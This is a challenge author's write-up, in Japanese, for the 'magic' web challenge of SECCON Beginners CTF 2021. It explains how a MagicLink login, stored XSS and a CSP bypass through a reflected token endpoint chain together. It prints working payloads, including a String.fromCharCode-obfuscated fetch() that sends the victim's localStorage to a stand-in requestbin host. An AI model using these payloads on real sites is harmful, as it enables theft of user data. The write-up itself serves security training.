---
title: "SECCON Beginners CTF 2021【Web】magic 作問者writeup"
description: "SECCON Beginners CTF 2021【Web】magic 作問者writeup"
tags: [CTF, SECCON, ctf4b]
slug: posts/20210523-3
authors: [hi120ki]
---

SECCON Beginners CTF 2021で出題したWeb問題「magic」(想定難易度:Hard)の作問者writeupです。

ログインを簡単に行えるMagicLink機能が攻撃に悪用される可能性があることを扱った問題です。

<!-- truncate -->

## 状況

まず「アプリの機能」「アプリの脆弱性」「保護機構の設定」「攻撃対象の行動」をまとめます。

**アプリの機能**

- ログイン機能がついているメモアプリ。ユーザーは任意の文字列のメモを保存できる。
- 途中まで記入したメモはLocalStorageに保存され、ブラウザを一回閉じても復元される。
- リンクにアクセスするだけでログインができるMagicLinkを発行できる。
- ユーザーのセッション情報はCookieに保存される。

**アプリの脆弱性**

- 保存されたメモはhtmlエスケープされず、任意のhtmlタグをトップページに埋め込むことができる。(各ユーザーしか閲覧できない箇所のXSS)

**保護機構の設定**

- セッション情報を格納するCookieにはHttpOnlyが付与されており、JavaScriptからは直接取得できない。
- コンテンツセキュリティポリシー(CSP)が設定されており、CSS及びJavaScriptは同一オリジンから取得したもののみ実行される。

**攻撃対象の行動(crawl.js)**

1. 自分のアカウントにログインする。
2. フラグをメモとして途中まで記入する。(LocalStorageにフラグが保存される)
3. プレイヤーから送信されたURLへアクセスする。

## 解法

CookieにはHttpOnlyが付与されているので攻撃対象のセッション情報をXSSで抜き出すことはできません。よってフラグを取得するための方法として考えられるのが、「フラグが保存されている攻撃対象のLocalStorageをXSSで抜き出す」です。

しかしここで2つの壁があります

1. アクセスするだけでプレイヤーが仕込んだXSSを発火させることができるURLを用意する
2. CSPによってサイト自身のドメインから取得したJavaScriptのみしか実行されない中でXSSを作る

この(1)はアプリの脆弱性が「各ユーザーしか閲覧できない箇所のXSS」であるのが原因です。自分のアカウントのメモにXSSを仕込んだとしてもそのURLはhttps://magic.quals.beginners.seccon.jpであり、攻撃対象をこのURLにアクセスさせると攻撃対象自身のアカウントでログインした状態のページが表示されるだけで仕込んだXSSは効果を発揮しません。

ここで用いることができるのがMagicLinkです。リンクにアクセスするだけでログインができるので、「XSSを仕込んだアカウントへログインできるMagicLink」を攻撃対象にアクセスさせることで、XSSを仕込んだアカウントへ攻撃対象が誘導されXSSが発火します。このときログインするユーザーは変わりますが、アプリの実装上LocalStorageは変更されません。よってLocalStorageを窃取するXSSをメモに仕込んだアカウントのMagicLinkをReportページで送信することでフラグを取得できます。

そして(2)についてはCSPの設定が`script-src 'self'`つまりサイト自身のドメインから取得したJavaScriptのみ実行され、`<script>alert(1)</script>`や`<img src="x" onerror="alert(1)">`などのインラインスクリプトは実行されません。

しかしCSPの設定を診断するサイト[CSP Evaluator](https://csp-evaluator.withgoogle.com/)で調べてみると「'self' can be problematic if you host JSONP, Angular or user uploaded files.」と表示されます。これは「あなたのサイトにJSONPエンドポイントがあったり、Angularライブラリを読み込んでいたり、ファイルアップロード機能がある場合、XSSができる可能性がある」ということです。

これらはそれぞれ有名なCSPバイパス手法なのですが今回はどの機能もありません。しかしよく実装を確認するとJSONPエンドポイントの代わりとなるAPIが存在します。

```js
app.get("/magic", async (req, res, next) => {
  ...
  const token = req.query.token.toString();
  ...
  try {
    const result = await query(
      "SELECT id, name FROM user WHERE magic_token = ?",
      [token]
    );
    if (result.length !== 1) {
      return res.status(200).send(escapeHTML(token) + " is invalid token.");
    }
    ...
  }
});

function escapeHTML(string) {
  return string
    .replace(/\&/g, "&amp;")
    .replace(/\</g, "&lt;")
    .replace(/\>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/\'/g, "&#x27");
}
```

例えばhttps://magic.quals.beginners.seccon.jp/magic?token=testにアクセスすると`test is invalid token.`という文字列が返ってきます。もしこの`text`にJavaScriptのコードを埋め込むとサイト自身のドメインから取得したJavaScriptとして処理させることができるため`<script src="/magic?token=(任意のJavaScriptコード)"></script>`というメモを保存することでXSSが作れそうです。このAPIは埋め込んだ文字列の後に`is invalid token.`が続くのでこれをコメントアウトするようにすると

```html
<script src="/magic?token=alert(1)//"></script>
```

この文字列をメモとして保存することでXSSが発火することが確認できます。

そして、LocalStorageを窃取したいので以下のようなJavaScriptのコードを埋め込もうとします。

```js
fetch(
  "https://requestbin.example.com/?ctf4bflag=" +
    encodeURI(localStorage.getItem("memo")),
);
```

しかし`/magic?token=`APIでトークンがレスポンスに埋め込まれるときに`escapeHTML`関数によってHTMLエスケープされます。よって`String.fromCharCode`を使って`&<>"'`を含まない文字列でこのXSSを作ると

```js
fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,101,120,97,109,112,108,101,46,99,111,109,47,63,99,116,102,52,98,102,108,97,103,61)%2BencodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));
```

となります。そしてこのコードをscriptタグに仕込んでメモに書き込みます。

```html
<script src="/magic?token=fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,101,120,97,109,112,108,101,46,99,111,109,47,63,99,116,102,52,98,102,108,97,103,61)%2BencodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));//"></script>
```

MagicLink機能でXSSを仕込んだアカウントにログインできるURLを生成し、そのURLの`/magic?token=xxxx-xxxx`をReportページで送信することで攻撃対象のブラウザで発火したXSSからリクエスト

https://requestbin.example.com/?ctf4bflag=ctf4b%7Bw0w_y0ur_skil1ful_3xploi7_c0de_1s_lik3_4_ma6ic_7rick%7D

が飛んできてフラグ

```
ctf4b{w0w_y0ur_skil1ful_3xploi7_c0de_1s_lik3_4_ma6ic_7rick}
```

が取得できます。

## 出題意図

最近のCTFでよく出題されるブラウザのセキュリティ機構とそのバイパス方法についての知識と技能を問うためにこの問題を出題しました。MagicLink機能をうまく使ったりサーバー側の処理を踏まえた攻撃コードを組む必要があり、ブラウザの詳細な挙動を含むWebセキュリティの知識・発想力、そしてJavaScript力が求められる難問だったと思います。

また、`&<>"'`を含まない文字列でJavaScriptコードを作る方法はいろいろあるので参加された方のwriteupを見るのが楽しみです。

今回はご参加ありがとうございました。
